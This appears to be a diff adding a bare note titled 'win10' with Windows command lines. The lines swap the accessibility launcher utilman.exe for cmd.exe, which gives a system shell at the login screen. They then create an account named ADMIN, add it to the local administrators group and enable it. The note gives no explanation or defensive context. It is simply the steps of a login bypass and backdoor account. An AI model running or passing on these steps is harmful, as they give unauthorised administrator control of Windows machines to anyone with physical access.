@@ -1,0 +1,10 @@
+win10
+
+shift + F10
+cd windows\system32
+ren utilman.exe utilman1.exe
+copy cmd.exe utilman.exe
+
+net user ADMIN /add
+net localgroup administrators ADMIN /add
+net user ADMIN /active:yes
